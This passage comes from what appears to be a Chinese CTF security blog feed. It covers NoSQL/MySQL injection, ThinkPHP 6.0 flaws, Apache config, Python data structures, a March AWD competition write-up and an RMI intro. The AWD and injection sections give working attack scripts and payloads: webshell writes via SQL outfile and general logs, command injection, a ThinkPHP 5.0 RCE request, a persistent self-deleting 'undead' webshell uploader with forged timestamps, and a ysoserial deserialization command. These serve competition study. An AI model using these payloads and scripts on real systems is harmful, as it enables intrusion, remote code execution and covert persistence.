$collection-&gt;find($data);</code></pre><p>但是由于php松散结构的特性，如果我们_GET传入的是数组那么，会自动被解析成字典。比如我们输入<code>?username[$ne]=1&amp;password[$ne]=1</code>， 就会被解析成：</p><pre><code>{    &#39;username&#39;: {        &#39;$ne&#39;: &#39;1&#39;    },    &#39;password&#39;: {        &#39;$ne&#39;: &#39;1&#39;    }}</code></pre><p>这样就能查询到所有用户信息</p><p>Js注入</p><pre><code>$collection = $db-&gt;users;$query_body =&quot;        function q() {            var username = &#39;&quot;.$_REQUEST[&quot;username&quot;].&quot;&#39;;            var password = &#39;&quot;.$_REQUEST[&quot;password&quot;].&quot;&#39;;if(username == &#39;secret_user&#39;&amp;&amp;password == &#39;secret_password&#39;) return true; else{ return false;}}&quot;; $result = $collection-&gt;find(array(&#39;$where&#39;=&gt;$query_body));$count = $result-&gt;count();if($count&gt;0){    echo $doc_succeed-&gt;saveHTML();}</code></pre><p><code>$where</code>操作符表示执行其中的Js内容，返回True的话返回所有内容。</p><p>我们可以看到我们可以注入使得Js代码提前返回True</p><p>payload：<code>?username=qwer&amp;password= 1&#39;;return true;var qwer=&#39;1</code></p><h2 id="MySQL利用方式"><a href="#MySQL利用方式" class="headerlink" title="MySQL利用方式"></a>MySQL利用方式</h2><h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><h4 id="联合查询写shell"><a href="#联合查询写shell" class="headerlink" title="联合查询写shell"></a>联合查询写shell</h4><pre><code>UNION+ALL+SELECT+1,2,’&lt;? phpinfo(); ?&gt;’ into outfile ‘G:/2.txt’ %23</code></pre><h4 id="非联合查询写shell"><a href="#非联合查询写shell" class="headerlink" title="非联合查询写shell"></a>非联合查询写shell</h4><pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 into outfile ‘G:/2.txt’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23</code></pre><h4 id="使用日志写shell"><a href="#使用日志写shell" class="headerlink" title="使用日志写shell"></a>使用日志写shell</h4><pre><code class="p">set global general_log = on;开启日志监测，一般是关闭的，如果一直开，文件会很大的。set global general_log_file = ‘G:/2.txt’;这里设置我们需要写入的路径就可以了。select ‘&lt;?php eval($_POST[‘shiyan’]);?&gt;’;查询一个一句话，这个时候log日志里就会记录这个。set global general_log_file = ‘D:\xampp\mysql\data\LAPTOP-SO1V6ABB.log’;结束后，再修改为原来的路径。set global general_log = off;关闭下日志记录。</code></pre><h4 id="延时注入写shell"><a href="#延时注入写shell" class="headerlink" title="延时注入写shell"></a>延时注入写shell</h4><pre><code>select sleep(2),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; into outfile &#39;d:\\success.txt&#39;;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python数据结构</title>
      <link href="/posts/7f8e2ad4/"/>
      <url>/posts/7f8e2ad4/</url>
      
        <content type="html"><![CDATA[<p>补充一个小知识</p><p>python 输入重定向为文件</p><pre><code>import syssys.stdin = open(&quot;test.txt&quot;)</code></pre><p>之后就可以直接从文件读入，不需要手动输入了</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><pre><code>实现链表输入1 3 5 4 1 9 4 将其存储为链表格式</code></pre><p>链表数据结构：</p><pre><code class="python">class ListNode:    def __init__(self, x=-1):        self.val = x        self.next = None</code></pre><h3 id="创建链表，返回头节点-尾插法"><a href="#创建链表，返回头节点-尾插法" class="headerlink" title="创建链表，返回头节点 (尾插法)"></a>创建链表，返回头节点 (尾插法)</h3><pre><code class="python">def creat_list(line:list) -&gt; ListNode:    root = ListNode()    tail = root    for i in line:        temp = ListNode(i)        tail.next = temp        tail = tail.next      return root.next</code></pre><h3 id="遍历链表"><a href="#遍历链表" class="headerlink" title="遍历链表"></a>遍历链表</h3><pre><code class="python">def traverse_list(root:ListNode):    &#39;&#39;&#39;    遍历链表，没有头节点    &#39;&#39;&#39;    temp = root    while temp:        print(temp.val+&quot; &quot;,end=&quot;&quot;)        temp = temp.next    print()</code></pre><h3 id="删除倒数第n个节点，一次遍历"><a href="#删除倒数第n个节点，一次遍历" class="headerlink" title="删除倒数第n个节点，一次遍历"></a>删除倒数第n个节点，一次遍历</h3><p>用两个指针指向，第一个指针先走 <code>n+1</code> 步，中间空出n个节点，然后删除即可</p><pre><code class="python">def removeNthFromEnd(head:ListNode, n:int)-&gt;ListNode:    &#39;&#39;&#39;    一次遍历算法    &#39;&#39;&#39;    new_head = ListNode(-1)    new_head.next = head    first = new_head    second = new_head    for i in range(n+1):        first = first.next        while first != None:        first = first.next        second = second.next    second.next = second.next.next    return new_head.next</code></pre><h3 id="向右旋转链表"><a href="#向右旋转链表" class="headerlink" title="向右旋转链表"></a>向右旋转链表</h3><p>就是把单链表组成一个循环链表</p><pre><code class="python">def rotateRight(head:ListNode, k:int)-&gt;ListNode:    &#39;&#39;&#39;    针对链表进行旋转    &#39;&#39;&#39;    if k == 0:        return head    if head == None:        return head    temp = head    length = 0    while temp.next != None:        length += 1        temp = temp.next    length += 1    temp.next = head    temp = head    for i in range((length - k%length -1)):        temp = temp.next    new_head = temp.next    temp.next = None    return new_head</code></pre><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="创建图"><a href="#创建图" class="headerlink" title="创建图"></a>创建图</h3><p>采用邻接表进行存储， <code>ArcNode</code> 代表邻接点， <code>VNode</code> 代表边节点</p><pre><code class="python">class ArcNode:    def __init__(self,adjvex, weight):        self.adjvex = adjvex        self.weight = weight        self.next = Noneclass VNode:    def __init__(self):        self.next = None</code></pre><p>输入数据</p><pre><code>输入格式：4 40 1 1 01 0 1 01 1 0 11 1 1 1</code></pre><p>读入数据，创建邻接矩阵</p><pre><code class="python">def create_table()-&gt;list:    m,n = [int(i) for i in input().split()] # 自动解包    A = [0 for i in range(m)]    for i in range(m):        A[i] = [int(j) for j in input().split()]    return A</code></pre><p>邻接矩阵转换为邻接表</p><pre><code class="python">def create_Adj(A)-&gt;list:    &#39;&#39;&#39;    邻接矩阵转换为邻接表    &#39;&#39;&#39;    G = [VNode() for i in range(len(A))]    for i,vex in enumerate(A):        # 第i个节点，及其所有的边        for node,j in enumerate(vex):            if j != 0:                p = ArcNode(node, j)                p.next = G[i].next                G[i].next = p    return G</code></pre><p>打印邻接表</p><pre><code class="python">def disp_adj(G):    for index,i in enumerate(G):        p = i.next        print(index, end=&quot;&quot;)        while p != None:            print(&quot; {}-&gt;&quot;.format(p.adjvex), end=&quot;&quot;)            p = p.next        print()</code></pre><h3 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h3><pre><code class="python">visited = [0 for i in range(4)]def DFS(G, v):    &#39;&#39;&#39;    深度优先搜索    &#39;&#39;&#39;    visited[v] = 1    print(v, end=&quot;&quot;)    p = G[v].next    while p != None:        w = p.adjvex        if visited[w] == 0:            DFS(G,w)        p = p.next    print()</code></pre><h3 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h3><pre><code class="python">def BFS(G, v):    &#39;&#39;&#39;    广度优先搜索    &#39;&#39;&#39;    q = Queue()    visited = [0 for i in range(len(G))]    print(v,end=&quot;&quot;)    visited[v] = 1    q.put(v)    while not q.empty():        w = q.get()        p = G[w].next        while p!=None:            if visited[p.adjvex] == 0:                print(p.adjvex, end=&quot;&quot;)                visited[p.adjvex] = 1                q.put(p.adjvex)            p = p.next    print()</code></pre><h3 id="Dijkstar-算法"><a href="#Dijkstar-算法" class="headerlink" title="Dijkstar 算法"></a>Dijkstar 算法</h3><pre><code class="python">def Dijkstra(A, v):    &#39;&#39;&#39;    Dijkstar 算法    &#39;&#39;&#39;    for i in A:        for index,value in enumerate(i):            if value == -1:                i[index] = sys.maxsize    dist = A[v] # 原始v到各个顶点的距离    path = [0 for i in range(len(A))]     for i in range(len(A)):        if A[v][i] != -1:            path[i] = v        else:            path[i] = -1    s = [0 for i in range(len(A))]    s[v] = 1    for i in range(len(A)):        mindis = sys.maxsize        # 寻找最小路径长度顶点u        for j in range(len(A)):            if s[j] == 0  and dist[j] &lt; mindis:                u = j                mindis = dist[j]        s[u] = 1        for j in range(len(A)):            if s[j] == 0:                if A[u][j] &lt; sys.maxsize and dist[j] &gt; 0 and dist[u]+A[u][j] &lt; dist[j]:                    dist[j] = dist[u] + A[u][j]                    path[j] = u    return path, dist</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp6.0漏洞分析</title>
      <link href="/posts/314a66d3/"/>
      <url>/posts/314a66d3/</url>
      
        <content type="html"><![CDATA[<h2 id="通过session写文件"><a href="#通过session写文件" class="headerlink" title="通过session写文件"></a>通过session写文件</h2><p>漏洞点位于：<code>/think/session/Store.php</code></p><pre><code class="php">    /**     * session_id设置     * @access public     * @param string $id session_id     * @return void     */    public function setId($id = null): void    {        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());    }</code></pre><p>针对sessionid的校验不严</p><p><img src="/posts/314a66d3/1584448906099.png" alt></p><p>之后初始化session</p><p><img src="/posts/314a66d3/1584448927094.png" alt></p><p>保存session的过程： <code>think/session/Store.php</code></p><pre><code class="php">    /**     * 保存session数据     * @access public     * @return void     */    public function save(): void    {        $this-&gt;clearFlashData();        $sessionId = $this-&gt;getId();        if (!empty($this-&gt;data)) {            $data = $this-&gt;serialize($this-&gt;data);            $this-&gt;handler-&gt;write($sessionId, $data);        } else {            $this-&gt;handler-&gt;delete($sessionId);        }        $this-&gt;init = false;    }</code></pre><p>进入到 <code>write</code> 函数写入</p><p>最后存储到文件中</p><p><img src="/posts/314a66d3/1584449025846.png" alt></p><p>这样，如果我能控制session的数组中的某个值，就能直接写入shell</p><p>成功写入：</p><p><img src="/posts/314a66d3/1584449183704.png" alt></p><h2 id="6-0-POP链分析"><a href="#6-0-POP链分析" class="headerlink" title="6.0 POP链分析"></a>6.0 POP链分析</h2><p>入口</p><p><img src="/posts/314a66d3/1584451502585.png" alt></p><p>进入 <code>save</code> 函数</p><p><img src="/posts/314a66d3/1584451535191.png" alt></p><p>继续步入</p><p><img src="/posts/314a66d3/1584451560678.png" alt></p><p>进入到 <code>cleanContents</code> 函数，直接返回原值(没有过滤因为不是多维数组)</p><pre><code class="php">    public function cleanContents(array $contents)    {        $cachedProperties = array_flip([            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,        ]);        foreach ($contents as $path =&gt; $object) {            if (is_array($object)) {                $contents[$path] = array_intersect_key($object, $cachedProperties);            }        }        return $contents;    }</code></pre><p>返回</p><p><img src="/posts/314a66d3/1584451622290.png" alt></p><p>跟进 <code>set</code> 函数，这里的 <code>$this-&gt;store</code> 已经被覆盖为 File 类</p><p><img src="/posts/314a66d3/1584451656966.png" alt></p><p><img src="/posts/314a66d3/1584451671730.png" alt></p><p>最后有两个利用方式：</p><ol><li><pre><code class="php"> protected function serialize($data): string {     if (is_numeric($data)) {         return (string) $data;     }     $serialize = $this-&gt;options[&#39;serialize&#39;][0] ?? &quot;\Opis\Closure\serialize&quot;;     return $serialize($data); }</code></pre></li></ol><ol start="2"><li><p>利用伪协议任意文件写入</p></li></ol><p><img src="/posts/314a66d3/1584451721156.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apache配置文件简单记录</title>
      <link href="/posts/a3f2ee6b/"/>
      <url>/posts/a3f2ee6b/</url>
      
        <content type="html"><![CDATA[<p>一直不太清楚apache的配置文件，简单记录一下</p><p><code>/etc/apache2</code> 下的文件</p><p><code>apache2.conf</code> 是主配置文件，之后的 <code>available</code> 代表可用的, <code>enable</code> 代表已经启用的</p><p><img src="/posts/a3f2ee6b/1584192313504.png" alt></p><p><code>sites-enabled</code> 下</p><p><img src="/posts/a3f2ee6b/1584192394696.png" alt></p><p>000-default.conf 文件规定了网站根目录</p><pre><code>&lt;VirtualHost *:80&gt;        # The ServerName directive sets the request scheme, hostname and port that        # the server uses to identify itself. This is used when creating        # redirection URLs. In the context of virtual hosts, the ServerName        # specifies what hostname must appear in the request&#39;s Host: header to        # match this virtual host. For the default virtual host (this file) this        # value is not decisive as it is used as a last resort host regardless.        # However, you must set it for any further virtual host explicitly.        #ServerName www.example.com        ServerAdmin webmaster@localhost        DocumentRoot /var/www/html        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,        # error, crit, alert, emerg.        # It is also possible to configure the loglevel for particular        # modules, e.g.        #LogLevel info ssl:warn        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined        # For most configuration files from conf-available/, which are        # enabled or disabled at a global level, it is possible to        # include a line for only one particular virtual host. For example the        # following line enables the CGI configuration for this host only        # after it has been globally disabled with &quot;a2disconf&quot;.        #Include conf-available/serve-cgi-bin.conf&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet</code></pre><p><code>/etc/apache2/mods-enabled /mime.conf</code> 中配置了可以解析的文件类型</p><p><img src="/posts/a3f2ee6b/1584192584702.png" alt></p><p>这样就能解析 php5 等的后缀了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星盟3月AWD比赛</title>
      <link href="/posts/f1d265cd/"/>
      <url>/posts/f1d265cd/</url>
      
        <content type="html"><![CDATA[<p>又双叒叕的打了一次AWD比赛，简单地总结一下</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><h3 id="直接读flag"><a href="#直接读flag" class="headerlink" title="直接读flag"></a>直接读flag</h3><p>最开始放了web2，ssh连上去，d盾没扫出什么东西</p><p>然后开始一个个看(现在都流行不放shell，直接给flag的2333)</p><p><img src="/posts/f1d265cd/1584182423201.png" alt></p><p>丢给群里的其他师傅开始写批量</p><pre><code class="python">import requestsimport report = [20180,20280,20380,20480,20580,20680,20780,20880,20980,21080,21180,21280,21380,21480,21580,21680,21780,21880,21980,22080,22180,22280,22380,22480]url = &#39;http://ip:{port}/login.php&#39;for i in port:    r = requests.get(url=url.format(port=str(i)))    if r.status_code == 200:        try:            print(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])        except IndexError:            pass</code></pre><p>批量交flag(后来发现平台有设置csrf token。导致无法批量交。)</p><pre><code class="python">send_url = &#39;http://ip:8001/api/v1/challenges/attempt&#39;cookie = {&#39;Cookie&#39;: &#39;session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2&#39;}for flag in submit_flag:    data = {&quot;challenge_id&quot;:2,&quot;submission&quot;:flag}    requests.post(url=send_url,data=data,cookies=cookie)</code></pre><p>最后合并为十分钟交一次</p><pre><code class="python">import requestsimport refrom time import sleepwhile True:    port = [20180,20280,20380,20480,20580,20680,20780,20880,20980,21080,21180,21280,21380,21480,21580,21680,21780,21880,21980,22080,22180,22280,22380,22480]    url = &#39;http://ip:{port}/login.php&#39;    submit_flag = []    for i in port:        r = requests.get(url=url.format(port=str(i)))        if r.status_code == 200:            try:                submit_flag.append(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])            except IndexError:                pass    send_url = &#39;http://ip:8001/api/v1/challenges/attempt&#39;    cookie = {&#39;Cookie&#39;: &#39;session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2&#39;}    for flag in submit_flag:        data = {&quot;challenge_id&quot;:2,&quot;submission&quot;:flag}        req = requests.post(url=send_url,data=data,cookies=cookie)        if &#39;incorrect&#39; not in req.text:            print(&#39;提交正确&#39;)    sleep(600)</code></pre><p>ps.赛后师傅说并没有换cookie，用下面的代码就能批量交。</p><p><img src="/posts/f1d265cd/1584186516112.png" alt></p><h3 id="后台任意文件上传"><a href="#后台任意文件上传" class="headerlink" title="后台任意文件上传"></a>后台任意文件上传</h3><p>看到 <code>test.sql</code> 中是有用户名和密码的，登录之后有上传点</p><p>黑名单只有这几个。。而且htaccess还写错了，php5,php7,phtml也都没有过滤，不过上传之后还是会重命名，算是也过滤了 <code>.htaccess</code> </p><pre><code>$black_list = [&quot;ini&quot;,&quot;htacces&quot;,&quot;php&quot;,&quot;ph3&quot;,&quot;html&quot;];$ext=pathinfo($name)[&#39;extension&#39;];$ext =strtolower($ext);</code></pre><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="md文件解析漏洞"><a href="#md文件解析漏洞" class="headerlink" title="md文件解析漏洞"></a>md文件解析漏洞</h3><p>这个web套路好深2333</p><p>d盾可以扫到一个shell，但是是在markdown文件中，还有一个是库中的回调函数</p><p><img src="/posts/f1d265cd/1584182744449.png" alt></p><p>最开始以为是d盾误报，结果后来看了一眼 <code>.htaccess</code></p><pre><code>AddType application/x-httpd-php .html .md</code></pre><p>居然将markdown文件解析为php….这个思路挺强的</p><p>但是由于发现的比较晚，貌似都修好了</p><h3 id="ping命令执行"><a href="#ping命令执行" class="headerlink" title="ping命令执行"></a>ping命令执行</h3><pre><code class="php">function waf($str){    $str=str_replace(&#39; &#39;,&#39;&#39;,$str);    $str=str_replace(&#39;;&#39;,&#39;&#39;,$str);    $str=str_replace(&#39;|&#39;,&#39;&#39;,$str);    return $str;}function ping($host){    $host=waf($host);    var_dump($host);    system(&quot;ping -c 1 $host&quot;);}if(isset($_REQUEST[1]))    ping($_REQUEST[1]);</code></pre><p>这个命令执行倒是挺简单的， <code>&amp;cat&lt;/flag</code> 即可</p><pre><code class="python">import requestsimport report = [30180,30280,30680,30780,30980,31180,31280,31380,31480,31580,31780,31880,31980,32080,32180,32280,32380,32480,31080,30580,30380,30480,30880,31680]url = &#39;http://ip:{port}/common/function.php?1=&amp;cat&lt;/flag&#39;for i in port:    r = requests.get(url=url.format(port=str(i)))    try:        print(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])    except IndexError:        pass</code></pre><h3 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h3><p>审计源码发现 <code>admin, admin</code>  即可登陆</p><p>然后有文件上传点，直接传shell.md即可解析</p><p>事后写了一个批量上传不死马的脚本</p><pre><code class="python">import requestsimport hashlibbs_webshell = &quot;&quot;&quot;&lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = &#39;%s&#39;;    $code = &#39;&lt;?php if($_POST[&quot;pass&quot;]==&quot;%s&quot;){@eval($_POST[1]);}?&gt;&#39;;    while (1) {        file_put_contents($file, $code);        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; %s&#39;);        usleep(50);    }?&gt;&quot;&quot;&quot;secret = &quot;pxy&quot;shell_path = &quot;.pxy.php&quot;def md5_hash(s):    return hashlib.md5(s.encode()).hexdigest()def generateShell(ip):    pwd = md5_hash(secret + ip)    shell = bs_webshell % (shell_path, pwd, shell_path)    print(shell)    return shelldef checkShell(ip,shell_path):    url = &#39;http://%s/%s&#39; % (ip, shell_path)    try:        res = requests.get(url, timeout=3)    except:        pass    pwd = md5_hash(secret + ip)    res = requests.post(url, data={&#39;pass&#39;: pwd, &#39;1&#39;: &#39;echo(123);&#39;})    print(res.text)    if res.text == &#39;123&#39;:        print(&#39;[+]&#39;+ip,&#39;Check OK&#39;)ports = [30180,30280,30380,30480,30580,30680,30780,30880,30980,31080,31180,31280,31380,31480,31580,31680,31780,31880,31980,33080,32180,32280,32380,32480]ip = &quot;127.0.0.1&quot;for i in ports:    files = {&quot;pic&quot;:(&#39;shell.md&#39;, generateShell(ip), &#39;application/octet-stream&#39;)}    cookies = dict(PHPSESSID=&#39;fjue55il5q0v90fp8l66us6hq0&#39;)    url = &quot;http://&quot;+ip+&quot;:&quot;+str(i)    url_upload = url+&quot;/index.php?c=User&amp;a=upload&quot;    r = requests.post(url=url_upload,files=files, cookies=cookies)    if b&quot;successfully&quot; in r.content:        print(&quot;[+]&quot;+ip+&quot;:&quot;+str(i)+&quot; upload success&quot;)    url_1 = url + &quot;/upload/admin_shell.md&quot;    try:        r = requests.get(url_1,timeout=2)    except requests.exceptions.ReadTimeout:        checkShell(ip, &quot;upload/.pxy.php&quot;)</code></pre><p>后来研究发现，其实文件上传不仅仅是</p><pre><code>/index.php?c=User&amp;a=upload</code></pre><p>也可以</p><pre><code>/index.php?c=File&amp;a=save</code></pre><p>因为 <code>index.php</code> 是这样写的</p><pre><code class="php">$c=isset($_GET[&#39;c&#39;])?$_GET[&#39;c&#39;]:&#39;User&#39;;$a=isset($_GET[&#39;a&#39;])?$_GET[&#39;a&#39;]:&#39;Index&#39;;$obj=run_c($c);run_a($obj,$a);</code></pre><p>URL格式为：</p><pre><code>http://localhost/index.php?c=User&amp;a=home</code></pre><p>就是可以调用任意类的任意方法</p><p>ps比赛的时候我们是这么想的：</p><p>看到 <code>base.php</code> 中实例化了 <code>Smarty</code> </p><p><img src="/posts/f1d265cd/1584186763035.png" alt></p><p>之后看到这里有一处eval。</p><p><img src="/posts/f1d265cd/1584186784920.png" alt></p><p>于是就开始想能不能getshell，但是无果。</p><h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>感谢a2u13师傅</p><p>还是接前面的分析，可以执行任意类的任意方法。但是那个地方是字符串拼接！。</p><p>所以可以直接通过 <code>;</code> 进行命令注入</p><p><img src="/posts/f1d265cd/1584188249191.png" alt></p><p>File类需要登陆才能使用，换一个 <code>User</code>类就行</p><p><img src="/posts/f1d265cd/1584188382658.png" alt></p><p>比赛的时候确实没往这块想，还是要加强代码审计啊</p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><pre><code class="php">&lt;?phpclass home{    public $method;    public $args;    function __construct($method, $args) {        $this-&gt;method = $method;        $this-&gt;args = $args;    }    function __destruct(){        var_dump($this-&gt;method);        ($this-&gt;method)($this-&gt;args);    } }     $a=$_REQUEST[&#39;a&#39;];    @unserialize($a);     ?&gt;</code></pre><p>看上去挺像反序列化的，但是</p><pre><code>($this-&gt;method)($this-&gt;args);</code></pre><p>这里是报错的，所以比赛的时候没法利用</p><p>复盘的时候才意识到原来只有php7才可以这么用</p><p>经过测试发现只能直接动态调用system函数，eval和assert都是不行的</p><p><img src="/posts/f1d265cd/1584191203655.png" alt></p><p><img src="/posts/f1d265cd/1584191226590.png" alt="eval是不行的"></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>web1是最后放出来的，为了提高挑战性不给ssh密码。</p><p>但是稍微看两眼就会发现是tp5.0写的，还开了debug，于是直接RCE了</p><pre><code class="python">import requestsimport report = [10180,10280,10380,10480,10580,10680,10780,10880,10980,11080,11180,11280,11380,11480,11580,11680,11780,11880,11980,12080,12180,12280,12380,12480]url_flag = &#39;http://ip:{port}/public/index.php?s=captcha&#39;data = {&#39;_method&#39;:&#39;__construct&#39;,        &#39;filter[]&#39;:&#39;system&#39;,        &#39;method&#39;:&#39;get&#39;,&#39;get[]&#39;:&#39;cat /flag&#39;}for i in port:    r = requests.post(url=url_flag.format(port=str(i)),data=data)    if r.status_code == 200:        try:            print((re.findall(r&quot;(flag{.*})&quot;,r.text)[0]))        except IndexError:            pass</code></pre><p>这一波flag还是挺舒服的，但是遗憾的是没法修啊。。</p><p><img src="/posts/f1d265cd/1584183311879.png" alt></p><p>不过后来意识到可以直接将 <code>/var/www/html</code> 下的文件打包下载，还可以自己往里面写shell然后蚁剑连接进行修改。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI入门</title>
      <link href="/posts/aba5931d/"/>
      <url>/posts/aba5931d/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>RMI（Remote Method Invocation）为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在<strong>网络上的不同计算机中,</strong>它的底层是由<strong>socket</strong>和<strong>java序列化和反序列化</strong>支撑起来的。</p><p>Java RMI：Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><p>我们知道远程过程调用（Remote Procedure Call, RPC）可以用于一个进程调用另一个进程（很可能在另一个远程主机上）中的过程，从而提供了过程的分布能力。Java 的 RMI 则在 RPC 的基础上向前又迈进了一步，即提供分布式对象间的通讯。</p><h3 id="如何找到类？"><a href="#如何找到类？" class="headerlink" title="如何找到类？"></a>如何找到类？</h3><p>类似DNS中域名和IP的对应关系，RMI中有一个 <strong>RMIRegistry</strong> 来提供这种对应关系，客户端通过访问 <strong>RMIRegistry</strong> 来获得对应的类进行加载</p><h3 id="数据是如何传递的？"><a href="#数据是如何传递的？" class="headerlink" title="数据是如何传递的？"></a>数据是如何传递的？</h3><p>当客户端通过RMI注册表找到一个远程接口的时候，所得到的其实是远程接口的一个动态代理对象。当客户端调用其中的方法的时候，方法的参数对象会在序列化之后，传输到服务器端。服务器端接收到之后，进行反序列化得到参数对象。并使用这些参数对象，在服务器端调用实际的方法。调用的返回值Java对象经过序列化之后，再发送回客户端。客户端再经过反序列化之后得到Java对象，返回给调用者。这中间的序列化过程对于使用者来说是透明的，由动态代理对象自动完成。</p><p>所以客户端并不是直接和服务端进行通信的，而是由客户端代理和服务端代理进行通信</p><p>如下图：RMI服务器在 <strong>RMIRegistry</strong> 中进行注册，客户端去查找，然后再进行RMI调用</p><p><img src="/posts/aba5931d/1584862271326.png" alt></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>Hello接口</p><pre><code class="java">import java.rmi.Remote;import java.rmi.RemoteException;public interface Hello extends Remote{    public String hello() throws RemoteException;}</code></pre><p>对应的实现</p><pre><code class="java">import java.io.Serializable;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;/** * @description: Hello实现 * @author: Pxy * @create: 2020-03-12 22:15 **/public class RemoteHello extends UnicastRemoteObject implements Hello{    protected RemoteHello() throws RemoteException {        super();    }    public String  hello() throws RemoteException {        return &quot;hello&quot;;    }}</code></pre><p>创建一个服务端</p><pre><code class="java">import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.server.UnicastRemoteObject;/** * @description: RMI服务器 * @author: Pxy * @create: 2020-01-20 08:45 **/public class RMIServer {    public void start() throws Exception{        RemoteHello h = new RemoteHello();        LocateRegistry.createRegistry(1099);        Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h);    }    public static void main(String[] args) throws Exception {        RMIServer rmiServer = new RMIServer();        rmiServer.start();    }}</code></pre><p>客户端进行访问</p><pre><code class="java">import java.rmi.Naming;/** * @description: RMI客户端 * @author: Pxy * @create: 2020-01-20 08:57 **/public class TrainMain {    public static void main(String[] args) throws Exception {        Hello hello = (Hello) Naming.lookup(&quot;rmi://127.0.0.1/Hello&quot;);        System.out.println(hello.hello());    }}</code></pre><p>（最好能放在两个不同的文件夹</p><p>抓包看一些通信的数据</p><p><img src="/posts/aba5931d/1584863994742.png" alt></p><p>看到 return data, aced 就是java序列化后的标志</p><p><img src="/posts/aba5931d/1584864050735.png" alt></p><h2 id="攻击RMI服务端"><a href="#攻击RMI服务端" class="headerlink" title="攻击RMI服务端"></a>攻击RMI服务端</h2><p>这里用的java7</p><h3 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h3><blockquote><p>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。</p></blockquote><p>通俗点解释，它就是一个协议，一个在TCP/IP之上的线路层协议，一个RMI的过程，是用到JRMP这个协议去组织数据格式然后通过TCP进行传输，从而达到RMI，也就是远程方法调用</p><p>由于JRMP协议在传输过程中的数据是序列化后的，不管是服务端还是客户端，当接收到JRMP协议数据时，都会把序列化的数据进行反序列化的话，这样就可以互相对打</p><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><p>创建一个 RMI 服务：</p><pre><code class="java">import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;/** * @description: 创建一个RMI服务 * @author: Pxy * @create: 2020-03-22 15:18 **/public class App {    public static void main(String[] args) {        try {            LocateRegistry.createRegistry(1099);        } catch (RemoteException e) {            e.printStackTrace();        }        while(true);    }}</code></pre><p>在这个服务器上(其实都是在本地，只是区分一下)，存在有漏洞的Apache Common Collections库，那么就可以直接用 </p><pre><code>java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections1 calc.exe</code></pre><p><img src="/posts/aba5931d/1584864819094.png" alt></p><h2 id="参考"><a 